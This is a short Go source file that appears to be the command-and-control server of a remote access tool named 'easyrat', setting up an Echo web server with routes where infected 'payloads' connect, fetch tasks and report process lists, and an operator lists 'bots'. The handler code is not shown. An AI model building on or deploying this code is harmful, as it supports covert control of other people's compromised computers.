package main

import (
	"easyrat/utils"
	"fmt"

	"github.com/labstack/echo"
	"github.com/labstack/echo/middleware"
)

const (
	port = 5618
)

func main() {
	// Initialize database
	utils.ConnectDB()

	// Initialize server
	e := echo.New()
	e.HideBanner = true
	e.Use(middleware.CORSWithConfig(middleware.CORSConfig{
		AllowOrigins: []string{"*"},
		AllowHeaders: []string{echo.HeaderOrigin, echo.HeaderContentType, echo.HeaderAccept},
	}))

	// Payload Routes
	e.GET("/status", utils.RStatus)
	e.GET("/payload/disconnect", utils.RDisconnect)
	e.GET("/payload/get_tasks", utils.RGetTasks)
	e.POST("/payload/connect", utils.RConnect)
	e.POST("/payload/proclist", utils.RProcList)

	// Server Routes
	e.GET("/server/bots", utils.RGetBots)

	// Run server
	e.Logger.Fatal(e.Start(":" + fmt.Sprint(port)))
}
